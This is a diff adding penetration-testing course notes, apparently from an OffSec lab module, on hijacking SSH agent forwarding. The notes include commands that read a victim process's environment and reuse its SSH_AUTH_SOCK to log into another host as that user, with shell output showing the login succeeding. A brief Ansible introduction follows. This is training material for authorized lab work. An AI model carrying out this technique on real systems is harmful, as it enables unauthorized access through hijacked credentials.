@@ -98,9 +98,60 @@ mkdir ~/.ssh/controlmaster
 ls -al ~/.ssh/controlmaster/
 ```
 
+# SSH Hijacking uing SSH Agent and SSH Agent forwarding
 
+SSH-Agent is a utility that keeps track of a user’s private keys and allows them to be used without
+having to repeat their passphrases on every connection.
 
+For our SSH connections to work using SSH-Agent forwarding, we need to have our public key
+installed on both the intermediate server and the destination server. In our case, the intermediate
+server will be the controller machine and the destination server will be linuxvictim. We can copy
+our key to both of them using the ssh-copy-id command from our Kali VM, specifying our public
+key with the -i flag.
 
+`ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller`
 
+~/.ssh/config we need to put a forwardingAgent yes
 
+eval `ssh-agent`
+
+ssh-add
+
+ssh offsec@controller
+
+Note that in the attacker session, we’ll ssh to the intermediate box from a root
+kali shell to make sure that we are not leveraging the key pair we have in the kali
+home folder for authenticating with the intermediate server. In a real scenario,
+the attacker connection to the intermediate server would be performed from a
+different box.
+
+ps aux | grep ssh
+
+pstree -p offsec | grep ssh
+
+cat /proc/16381/environ 
+
+```
+SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l
+3072 SHA256:6cyHlr9fISx9kcgR9+1crO1Hnc+nVw0mnmQ/Em5KSfo kali@kali (RSA)
+root@controller:~# SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh
+offsec@linuxvictim
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64)
+...
+Last login: Thu Jul 30 11:14:26 2020 from 192.168.120.40
+```
+
+### 14.1.4.1 Exercises
+1. Reproduce ControlMaster hijacking in the lab.
+2. Reproduce SSH-Agent forwarding hijacking in the lab.
+
+# Devops
+
+There are many systems available that perform these sorts of functions. Puppet842 and Chef843
+are both popular, but in this module we will take a closer look at Ansible,844 which we’ve frequently
+encountered in penetration testing engagements.
+
+# introduction to ansible
+
+We can find the host inventory on the controller at /etc/ansible/hosts.
 
